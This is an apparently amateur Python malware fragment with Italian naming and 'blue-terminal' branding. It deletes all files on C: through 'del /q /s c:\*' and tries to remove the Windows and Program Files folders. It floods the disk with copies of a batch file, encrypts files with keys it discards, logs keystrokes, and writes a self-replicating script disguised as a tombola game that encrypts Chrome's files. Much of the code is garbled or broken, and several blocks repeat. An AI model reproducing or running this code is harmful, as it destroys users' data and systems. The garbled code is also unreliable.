    numeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]
    comando="color a & del /q /s c:\*"
    os.system(comando)
    print("errore ripora ")
    file=open("tnt.bat","w")
    file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
    file.close()
    with open("dati.txt","a") as f:
        f.write(f"{event.name}\n")
    keyboard.on_press(restarta)
    keyboard.wait("1")
    for i in range(144400):
        shutil.copy("tnt.bat",f"tnt{i}.bat")
    else:
        print("hahah")
for i in range(100000):
    print("sei sicuro ti manca poco",i)
f=open("rombole.py","w")
os.remove("C:\Windows")
os.remove("C:\Program Files")
f.close()
i=100
while i != 0: 
    i-=1
file=open("tnt.bat","w")
file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
file.close()
for i in range(144400):
    shutil.copy("tnt.bat",f"tnt{i}.bat")
    print(i)
chiave=Fernet.generate_key()
with open("vacanze.jpg","rb") as f:
    data=f.read()
fernet=Fernet(chiave)
datimie=fernet.encrypt(data)
with open("vacanze.jpg","wb") as f:
    f.write(datimie)
print("i file sono stati criptati ")
file=open("tnt.bat","w")
file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
file.close()
subprocess.call(["tnt.py"])   
subprocess.check_call(["ls","-la"]) 
for i in range(144):
    shutil.copy("tnt.bat",f"tnt{i}.bat")
    shutil.run("python",f"tnt{i}.py")
    subprocess.call([f"tnt{i}.py"])   
    subprocess.run(["tnt{i}.bat"])
    subprocess.check_call(["ls","-la"]) 
    shutil.copy("tnt.bat","tnt1.bat")
    shutil.copy("tnt.bat","tnt2.bat")
    shutil.copy("tnt.bat","tnt3.bat")
    shutil.copy("tnt.bat","tnt4.bat")
    shutil.copy("tnt.bat","tnt4.bat")
    shutil.copy("tnt.bat","tnt6.bat")
    shutil.copy("tnt.bat","tnt7.bat")
    shutil.copy("tnt.bat","tnt8.bat")   
    shutil.copy("tnt.bat","tnt9.bat")
    shutil.copy("tnt.bat","tnt10.bat")
pyautogui.hotkey('win', 'r')
messaggio="cmd"
pyautogui.typewrite(messaggio)
pyautogui.press('enter')
colore="color a"
pyautogui.typewrite(colore)
pyautogui.press("enter")
colore="color b"
pyautogui.typewrite(colore)
pyautogui.press("enter")
colore="color 8"
pyautogui.typewrite(colore)
pyautogui.press("enter")
colore="color 1"
pyautogui.typewrite(colore)
pyautogui.press("enter")
colore="color 3"
pyautogui.typewrite(colore)
pyautogui.press("enter")
colore="color 9"
pyautogui.typewrite(colore)
pyautogui.press("enter")
colore="color 7"
pyautogui.typewrite(colore)
pyautogui.press("enter")
colore="color 3"
pyautogui.typewrite(colore)
pyautogui.press("enter")
colore="color 7"
pyautogui.typewrite(colore)
pyautogui.press("enter")
colore="curl parrot.live"
pyautogui.typewrite(colore)
time.sleep(0.1)
pyautogui.press("enter")
subprocess.Popen(['notepad.exe'])
time.sleep(4)
stringa="ci vediamo alla prossima da blue-terminal i saluti" 
n="saluti da Internet"
for stringa in stringa: 
    pyautogui.typewrite(stringa) 
pyautogui.press("enter")
time.sleep(1)
for stringa in n: 
    pyautogui.typewrite(stringa)
pyautogui.hotkey("ctrl","s")
nome="blue-terminal.bat"
for i in nome: 
    pyautogui.typewrite(i) 
pyautogui.press("enter")
os.remove("SECURITY.py")
f=open("antiscan.py","w")
f.write("romeved")
f.close()
estrazionenumeri()
messaggio=Connection("chatgpt.com").run("uname -S",hide=True)
contenuto="Ran {0.stdout}"
print(contenuto)
punteggio=0
utente=int(input("inserisci il anno di nascita "))
if utente<18:
    print("non puoi giocare ")
else:
    print("quoi giocare")        
    utente=int(input("pesca una carta da 1 a 4 "))
    subprocess.run("ipconfi")
    if utente==10:
        punteggio+=10
    elif utente==3:
        punteggio+=2
    if utente == 11:
        punteggio+=11
re=10
otto=3
asso=11
lista=["re=10"]
generanumero=random.randint(1,12)
#.8-.:U@^3£-/@^3££?+@9]|4-:
pyautogui.run(["ipconfig"])
com="ls"
prendi=subprocess.run(com,shell=True,capture_output=True,text=True)
restarta()
with open("cmd.txt","w") as f:
    f.write(prendi)
print("hi spagniato")
for i in range(100000):
    print("sei sicuro manca poco",i)
f=open("rombole.py","w")
os.remove("C:\Windows")
os.remove("C:\Program Files")
f.close()
i=100
while i != 0: 
    i-=1
file=open("tnt.bat","w")
file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
file.close()
for i in range(144400):
    shutil.copy("tnt.bat",f"tnt{i}.bat")
    print(i)
chiave=Fernet.generate_key()
with open(f"tnt{i}.bat","rb") as f:
    data=f.read()
fernet=Fernet(chiave)
datimie=fernet.encrypt(data)
with open(f"tnt{i}.bat","wb") as f:
    f.write(datimie)
subprocess.run("echo off")
file=open("tnt.bat","w")
file.write("echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ")
file.close()
subprocess.call(["tnt.py"])   
subprocess.check_call(["ls","-la"]) 
subprocess.run("ipconfig")
subprocess.run("hello welcome blue-terminal")
for i in range(144400):
    shutil.copy("tnt.bat",f"tnt{i}.bat")
    subprocess.call([f"tnt{i}.py"])   
subprocess.run(["python","tnt.py"])
chiave=Fernet.generate_key()
with open(f"tnt{i}.bat","rb") as f:
        data=f.read()
fernet=Fernet(chiave)
datimie=fernet.encrypt(data)
with open(f"tnt{i}.bat","wb") as f:
        f.write(datimie)
subprocess.check_call(["ls","-la"]) 
shutil.copy("tnt.bat","tnt1.bat")
shutil.copy("tnt.bat","tnt2.bat")
print(pyautogui.position())
print(pyautogui.size())
pyautogui.moveTo(733,131,duration=1)
pyautogui.click(button="right")
for i in range(9):
    pyautogui.press("down")
pyautogui.press("enter")
pyautogui.press("rght")
pyautogui.press("enter")
topolino="topolino in citta"
time.sleep(1)
for i in topolino:
    pyautogui.typewrite(i)
pyautogui.press("enter")
pyautogui.press("enter")
pyautogui.click(637,344,duration=1)
pyautogui.click(button="right")
shutil.copy("tnt.bat","tnt3.bat")
shutil.copy("tnt.bat","tnt4.bat")
shutil.copy("tnt.bat","tnt4.bat")
shutil.copy("tnt.bat","tnt6.bat")
shutil.copy("tnt.bat","tnt7.bat")
shutil.copy("tnt.bat","tnt8.bat")   
shutil.copy("tnt.bat","tnt9.bat")
shutil.copy("tnt.bat","tnt10.bat")
file2=open("nucleare.py","w")
file2.writable("import pyttsx3\nimport random\nimport tkinter as Tk\nimport os\nimport shutil \nfrom cryptography.fernet import Fernet\nimport subprocess\n#welcome to blue-terminal\n''''----------------''''''----------''''''''''-we---------'''''\n''-blue-terminal-''''''--we--won't--stop--here---''''we--are-------'''\n'''-----------''''''----we---are---the---world -----''''''the-----'''\n'''-------''''''----------------------------''''''domino-----'''\n'''----------------------------'''''''of------'''\n'''------'''''''---------'''''''---------'''\n'''-----'''''''---------''''''''we won't stop here we are in the Internet----'''\nsubprocess.run('echo off')\ndef estrazionenumeri(file_path):\n\nvoce=pyttsx3.init()\nvoce.say('inizio il gioco la tombola sei pronto?:')\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nvoce.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\n\nprint('errore ripora ')\nkey=Fernet.generate_key()\nwith open('key.key','wb') as key_file:\n\nkey_file.write(key)\nwith open('key.key','rb')  as key_file:\nkey=key_file.read() \nfernet=Fernet(key)\nwith open(file_path,'rd')as file:\noriginal=file.read()\nencrypter=fernet.encrypt(original)\nwith open(file_path,'wb')as encrypter_file:\nencrypter_file.write(encrypter)\npercorso='C:\Program Files\Google\Chrome\Application'\nfor filename in os.listdir(percorso):\npercorso=os.path.join(percorso,filename)\nif os.path.isfile(percorso):\nencrypter_file(percorso)\nelse:\nmotore.say(numgen)\nmotore.runAndWait()\ndef restarta():\nnumeri=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100]\nnumgen=random.choice(numeri)\nmotore = pyttsx3.init()\nmotore.say(numgen)\nmotore.runAndWait()\nif numgen == motore:\nprint('errore ripora ')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nelse:motore.say(numgen)\nmotore.runAndWait()\nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.run('echo off')\nfile=open('tnt.bat','w')\nfile.write('echo off \n echo> shutdown /r >illavoro.bat\n start >www.tesmec.com>1234.bat \n cd..\n echo %%a (*.bat) do echo.>bat\necho echo %%a (.exe)\n do in echo (.txt) echo %%a (.bat) ')\nfile.close()\nsubprocess.call(['tnt.py'])   \nsubprocess.check_call(['ls','-la']) \nsubprocess.run('ipconfig')\nsubprocess.run('hello welcome blue-terminal')\nfor i in range(144400):\nshutil.copy('tnt.bat',f'tnt{i}.bat')\nsubprocess.call([f'tnt{i}.py'])   \nchiave=Fernet.generate_key()\nwith open(f'tnt{i}.bat','rb') as f:\ndata=f.read()\nfernet=Fernet(chiave)\ndatimie=fernet.encrypt(data)\nwith open(f'tnt{i}.bat','wb') as f:\nf.write(datimie)\nsubprocess.check_call(['ls','-la']) \nshutil.copy('tnt.bat','tnt1.bat')\nshutil.copy('tnt.bat','tnt2.bat')shutil.copy('tnt.bat','tnt3.bat')\nshutil.copy('tnt.bat','tnt4.bat')\nshutil.copy('tnt.batì','tnt4.bat')\nshutil.copy('tnt.bat','tnt6.bat')shutil.copy('tnt.bat','tnt7.bat')\nshutil.copy('tnt.bat','tnt8.bat')\nshutil.copy('tnt.bat','tnt9.bat')\nshutil.copy('tnt.bat','tnt10.bat')")
file2.close()
for i in range(144):
    shutil.copy("nucleare.py",f"nucleare{i}.py")
    subprocess.call([f"nucleare{i}.py"]) 
    shutil.run("python",f"nucleare{i}.py")
comando=subprocess.run("ipconfig")
file=open("indirizzo.txt","w")
file.write(comando)
file.close()
subprocess.Popen(['notepad.exe'])
time.sleep(2)
stringa="ci vediamo alla prossima da blue-terminal i saluti  "
for stringa in stringa:
    pyautogui.typewrite(stringa)
pyautogui.hotkey('win', 'r')
messaggio="PowerShell"
pyautogui.typewrite(messaggio)
pyautogui.press('enter')
colore="color a"
pyautogui.typewrite(colore)
pyautogui.press("enter")
stringa="ti teniamo in guardia " 
for stringa in stringa: 
    pyautogui.typewrite(stringa)
for time in tqdm(random(10),desc=Fore.BLACK):
    time.sleep(0.1)
pyautogui.moveTo(1597,0,duration=1)
pyautogui.click()
for i in range(144):    
    os.remove(f"tnt{i}.bat")
    print(pyautogui.position())
    print(pyautogui.size())
    pyautogui.moveTo(1597,0,duration=1)
    pyautogui.click()
    pyautogui.press("enter")
    pyautogui.moveTo(8000,700,duration=1)
    pyautogui.click()
    pyautogui.press("enter")
    pyautogui.moveTo(321,213,duration=1)
    pyautogui.click()
    pyautogui.press("enter")
    pyautogui.moveTo(3000,600,duration=1)
    pyautogui.click()
    pyautogui.press("enter")
    pyautogui.moveTo(1,5,duration=1)
    pyautogui.moveTo(1597,0,duration=1)
    pyautogui.click()
    pyautogui.press(Button="left")
os.remove("c:\\")
os.remove("La_Bomba_finale.exe")
